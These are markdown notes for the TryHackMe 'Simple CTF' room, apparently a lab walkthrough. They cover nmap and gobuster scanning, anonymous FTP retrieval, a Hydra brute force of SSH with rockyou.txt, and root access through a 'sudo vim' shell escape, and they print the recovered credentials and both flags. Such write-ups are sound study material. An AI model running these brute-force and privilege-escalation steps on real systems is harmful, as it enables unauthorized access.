# Simple CTF

```bash
export IP=10.10.121.109
```

## Scans

### Nmap

Initial Nmap Scan:
```bash
nmap -sC -sv -oN scans/nmap.initial $IP
```

Open Ports Found:
```
21 -- ftp
80 -- webpage
2222 -- ssh
```

OS -- Apache 2 Ubuntu, Linux

### Gobuster

```
gobuster dir -w /path/to/wordlist.txt -u http://10.10.121.109
```

Directories found:
```
/simple
/server-status -- 403 Forbidden
```

found name `mike` in robots.txt


## FTP

looking around in FTP:
```
ftp> nlist
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get
(remote-file) ForMitch.txt
(local-file) ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (593.8072 kB/s)
```

found name `mitch` in `ForMitch.txt`


## Hydra

Bruteforcing username `mitch` with `rockyou.txt` passwordlist on SSH port 2222

```bash
hydra -l mitch -P wordlists/rockyou.txt ssh://10.10.121.109:2222
```

found credentials: `mitch:secret`


## SSH into Machine
```bash
ssh mitch@10.10.121.109 -p 2222
```

```bash
ls
cat user.txt
```

**User Flag Found**: `G00d j0b, keep up!`

new user `sunbath` found in `/home/`

PrivEsc by:
```bash
sudo -l
```

and searching vim on [gtfoBins](https://gtfobins.github.io/gtfobins/vim/)

```bash
sudo vim -c ':!/bin/sh'
```

```
whoami
cd /root/
cat root.txt
```

**Root flag found**: `W3ll d0n3. You made it!`


----
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
